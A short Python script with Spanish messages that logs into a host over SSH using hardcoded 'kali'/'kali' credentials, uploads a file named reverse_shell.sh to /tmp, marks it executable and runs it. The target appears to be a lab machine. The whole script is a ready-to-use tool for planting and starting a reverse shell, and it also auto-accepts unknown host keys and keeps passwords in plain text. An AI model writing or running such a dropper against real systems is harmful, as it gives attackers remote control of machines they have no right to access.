import paramiko
import os

host = '192.168.50.104'
username = 'kali'
password = 'kali'
local_script_path = 'reverse_shell.sh'
remote_script_path = '/tmp/reverse_shell.sh'

ssh_client = paramiko.SSHClient()
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    ssh_client.connect(host, username=username, password=password)
    print(f'Conectado al host {host}')

    sftp_client = ssh_client.open_sftp()
    sftp_client.put(local_script_path, remote_script_path)
    print(f'Archivo {local_script_path} transferido a {remote_script_path} en el host remoto.')

    ssh_client.exec_command(f'chmod +x {remote_script_path}')

    stdin, stdout, stderr = ssh_client.exec_command(f'{remote_script_path}')
    print(f'Comando de ejecución enviado: {remote_script_path}')

    output = stdout.read().decode()
    error = stderr.read().decode()
    if output:
        print(f'Output: {output}')
    if error:
        print(f'Error: {error}')

except Exception as e:
    print(f'Error al conectar al host: {e}')

finally:
    ssh_client.close()